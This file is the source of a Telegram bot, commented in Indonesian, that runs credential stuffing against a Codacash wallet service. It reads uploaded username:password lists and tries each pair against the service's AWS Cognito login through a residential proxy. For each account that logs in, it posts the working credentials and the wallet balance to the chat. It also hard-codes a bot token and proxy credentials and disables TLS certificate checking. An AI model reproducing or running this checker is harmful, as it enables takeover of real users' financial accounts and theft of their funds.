process.env.NODE_TLS_REJECT_UNAUTHORIZED = "0";

const { Telegraf } = require('telegraf');
const axios = require('axios');
const { HttpsProxyAgent } = require('https-proxy-agent');

// Token Bot
const BOT_TOKEN = '8627582721:AAHnw24k_cUjtuveRpCV9C5UDDc9RQMibOo';

// Konfigurasi Telegraf dengan Handler Error
const bot = new Telegraf(BOT_TOKEN, {
    handlerTimeout: 900000 // Naikkan limit ke 15 menit agar tidak timeout saat download file besar
});

// Proxy DataImpulse
const proxyAgent = new HttpsProxyAgent('http://8998c0d8430265a3c9ab:f4cd725960d1892a@gw.dataimpulse.com:823');

// Fungsi Pengecekan
async function checkAccount(username, password) {
    try {
        const authPayload = JSON.stringify({
            AuthFlow: "USER_PASSWORD_AUTH",
            ClientId: "437f3u0sfh7h0av5rlrrjdtmsb",
            AuthParameters: { USERNAME: username, PASSWORD: password },
            ClientMetadata: { country_code: "ph", lang_code: "en" }
        });

        const authReq = await axios.post("https://cognito-idp.ap-southeast-1.amazonaws.com/", authPayload, {
            headers: {
                "x-amz-target": "AWSCognitoIdentityProviderService.InitiateAuth",
                "Content-Type": "application/x-amz-json-1.1",
                "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"
            },
            httpsAgent: proxyAgent,
            validateStatus: () => true,
            timeout: 20000 // Timeout per akun 20 detik
        });

        if (authReq.data?.AuthenticationResult) {
            const idToken = authReq.data.AuthenticationResult.IdToken;
            const walletReq = await axios.get("https://wallet-api.codacash.com/user/wallet", {
                headers: { "Authorization": idToken, "x-country-code": "608" },
                httpsAgent: proxyAgent,
                validateStatus: () => true,
                timeout: 15000
            });
            return { status: 'live', balance: walletReq.data?.data?.balanceAmount || 0 };
        }
        return { status: 'die' };
    } catch (e) {
        return { status: 'error' };
    }
}

bot.start((ctx) => ctx.reply('🤖 RecnomPay Anti-Crash Ready!'));

bot.on('document', async (ctx) => {
    if (!ctx.message.document.file_name.endsWith('.txt')) return;

    const waitMsg = await ctx.reply('⏳ Sedang mengunduh file besar... Mohon tunggu.');

    try {
        const fileLink = await ctx.telegram.getFileLink(ctx.message.document.file_id);
        
        // Gunakan timeout pada axios download file juga
        const response = await axios.get(fileLink.href, { timeout: 300000 }); 
        const lines = response.data.split('\n').map(l => l.trim()).filter(l => l.includes(':'));

        await ctx.telegram.editMessageText(ctx.chat.id, waitMsg.message_id, null, `✅ Terdeteksi <b>${lines.length} akun</b>. Memulai check...`, { parse_mode: 'HTML' });

        for (let i = 0; i < lines.length; i += 30) {
            const chunk = lines.slice(i, i + 30);
            const results = await Promise.all(chunk.map(async (line) => {
                const [u, p] = line.split(':');
                if(!u || !p) return null;
                const res = await checkAccount(u.trim(), p.trim());
                return { u, p, res };
            }));

            let batchLive = results.filter(item => item && item.res.status === 'live');
            
            if (batchLive.length > 0) {
                let report = `<b>📊 LIVE BATCH (${i + chunk.length}/${lines.length})</b>\n━━━━━━━━━━━━━━━━━━\n`;
                report += batchLive.map(item => `<code>${item.u}:${item.p}</code> | Bal: ${item.res.balance}`).join('\n');
                await ctx.reply(report, { parse_mode: 'HTML' }).catch(() => {});
            }
        }
        await ctx.reply('🏁 Semua akun selesai dicek!');
    } catch (err) {
        console.error("Error Processing File:", err.message);
        await ctx.reply('❌ Gagal memproses file: ' + err.message);
    }
});

// GLOBAL ERROR HANDLER - BIAR GAK MATI
bot.catch((err, ctx) => {
    console.log(`Oops, encountered an error for ${ctx.updateType}`, err);
});

bot.launch().then(() => console.log("Bot Running di Termux (Anti-Crash Mode)"));
